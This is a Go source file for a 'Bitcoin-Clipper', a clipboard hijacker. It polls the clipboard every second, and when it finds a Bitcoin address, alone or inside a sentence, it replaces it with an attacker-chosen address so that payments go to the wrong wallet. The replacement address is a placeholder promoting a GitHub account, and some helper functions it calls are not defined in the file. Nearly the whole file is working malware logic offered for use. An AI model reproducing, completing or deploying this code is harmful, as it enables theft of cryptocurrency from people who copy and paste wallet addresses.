package main

import (
	"fmt"
	"regexp"
	"strings"
	"time"

	"golang.design/x/clipboard"
	"Bitcoin-Clipper/helpers/bitcoin" // Make sure help packages are available.
)

// ContainsMultipleWords checks whether a string contains words or not.
func ContainsMultipleWords(s string) bool {
	trimmed := strings.TrimSpace(s)
	// equivalent to your regex logic for finding word boundaries
	matched, _ := regexp.MatchString(`\b\w+\b`, trimmed)
	return matched
}

// BitcoinClipper Non-stop clipboard monitoring
func BitcoinClipper(switchAddress string) {
	// Using an infinite loop for monitoring
	for {
		// equivalent to asyncio.sleep(1)
		time.Sleep(1 * time.Second)

		// Reading clipboard contents
		contentBytes := clipboard.Read(clipboard.FmtText)
		if contentBytes == nil {
			continue
		}
		content := strings.TrimSpace(string(contentBytes))

		if content == "" {
			continue
		}

		// The main logic of substitution
		if ContainsMultipleWords(content) {
			cb := &Clipboard{}
			cb.SetSentence(content, switchAddress)
		} else {
			if bitcoin.IsValidAddress(content) {
				SetContents(switchAddress)
			}
		}
	}
}

func main() {
	// Initializing the clipboard
	err := clipboard.Init()
	if err != nil {
		panic(fmt.Errorf("could not init clipboard: %v", err))
	}

	switchAddress := "download this on github (github.com/notkatsu)"
	
	fmt.Println("Clipper started... Monitoring clipboard.")
	
	// Execute the main function
	BitcoinClipper(switchAddress)
}
